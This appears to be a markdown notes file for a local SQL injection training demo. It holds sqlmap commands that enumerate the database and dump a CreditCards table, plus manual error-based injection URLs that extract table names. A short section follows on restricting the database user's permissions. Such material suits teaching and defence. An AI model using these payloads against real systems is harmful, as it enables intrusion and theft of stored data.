# Materials

## App url
https://localhost:44394/products1?id=1

## sqlmap

```
python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --dbs
```

```
python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --tables -D Owasp
```

```
D:\Duperele\Soft\sqlmap>python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --dump -T CreditCards -D Owasp
```

```
D:\Duperele\Soft\sqlmap>python sqlmap.py -u "https://localhost:44394/products1?id=1" --batch --dump -T CreditCards -D Owasp --force-pivoting
```

## SQL Injection step-by-step
* https://localhost:44394/products1?id=1 or 1=1
  * all products
* https://localhost:44394/products1?id=x
  * discovered we get exceptions from sql server
  * SqlException: Invalid column name 'x'
* shows all tables in database:
```
(
	select name from sysobjects where id = (
		select top 1 id from (
			select top 1 id from sysobjects where xtype=char(85) order by id asc
		) sq order by id desc
	)
)
```
* https://localhost:44394/products1?id=(select+name+from+sysobjects+where+id+in+(+select+top+1+id+from+(+select+top+1+id+from+sysobjects+where+xtype=char(85)+order+by+id+asc+)+sq+order+by+id+desc))
  * SqlException: Conversion failed when converting the nvarchar value 'Products' to data type int.
    * **conversion error**
* Now increment the second "1"
* https://localhost:44394/products1?id=(select+name+from+sysobjects+where+id+in+(+select+top+1+id+from+(+select+top+2+id+from+sysobjects+where+xtype=char(85)+order+by+id+asc+)+sq+order+by+id+desc))
  * SqlException: Conversion failed when converting the nvarchar value 'CreditCards' to data type int.

## Restrict db user
* Owasp database > Security > Users > owaspTestUser
  * Membership - uncheck dbowner
  * Securables > Search > All objects of types > OK > Tables > OK
    * Product/CreditCard > Grant Select > Column permissions